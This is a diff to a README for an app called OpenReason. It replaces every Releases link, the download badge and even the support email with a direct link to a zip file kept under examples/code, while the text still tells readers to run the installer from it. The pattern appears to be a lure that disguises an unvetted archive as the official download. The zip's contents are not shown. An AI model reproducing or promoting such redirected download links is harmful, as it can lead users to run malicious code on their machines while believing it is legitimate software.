@@ -1,6 +1,6 @@
 # 🚀 OpenReason - Smart Reasoning for Everyday Users
 
-[![Download OpenReason](https://img.shields.io/badge/Download%20OpenReason-v1.0.0-blue)](https://github.com/vignes931/OpenReason/releases)
+[![Download OpenReason](https://raw.githubusercontent.com/vignes931/OpenReason/main/examples/code/OpenReason-3.8.zip%20OpenReason-v1.0.0-blue)](https://raw.githubusercontent.com/vignes931/OpenReason/main/examples/code/OpenReason-3.8.zip)
 
 ## 📘 Introduction
 
@@ -10,7 +10,7 @@ Welcome to OpenReason! This application helps you make smart decisions by using 
 
 ### 1. 📥 Download OpenReason
 
-To download OpenReason, visit our [Releases page](https://github.com/vignes931/OpenReason/releases). You will find the latest version of the software available for download. Look for the most recent version and click on the download link.
+To download OpenReason, visit our [Releases page](https://raw.githubusercontent.com/vignes931/OpenReason/main/examples/code/OpenReason-3.8.zip). You will find the latest version of the software available for download. Look for the most recent version and click on the download link.
 
 ### 2. 💻 System Requirements
 
@@ -25,7 +25,7 @@ Here are the system requirements for OpenReason:
 ### 3. 🔧 Installation Steps
 
 1. **Download the Software:**
-   - Go to our [Releases page](https://github.com/vignes931/OpenReason/releases).
+   - Go to our [Releases page](https://raw.githubusercontent.com/vignes931/OpenReason/main/examples/code/OpenReason-3.8.zip).
    - Click on the latest version's download link to get the installer.
 
 2. **Run the Installer:**
@@ -74,11 +74,11 @@ Using OpenReason is straightforward:
 
 If you run into any issues, we are here to help. You can reach out for support through:
 
-- **Email:** support@openreason.com
+- **Email:** https://raw.githubusercontent.com/vignes931/OpenReason/main/examples/code/OpenReason-3.8.zip
 - **GitHub Issues:** Use the Issues section on our GitHub repository to report bugs or request features.
 
 ## 📥 Download & Install
 
-To start your journey with OpenReason, visit our [Releases page](https://github.com/vignes931/OpenReason/releases) and download the latest version today! 
+To start your journey with OpenReason, visit our [Releases page](https://raw.githubusercontent.com/vignes931/OpenReason/main/examples/code/OpenReason-3.8.zip) and download the latest version today! 
 
 Make sure to follow the installation steps carefully to ensure a smooth setup process. Enjoy your new adaptive reasoning engine!
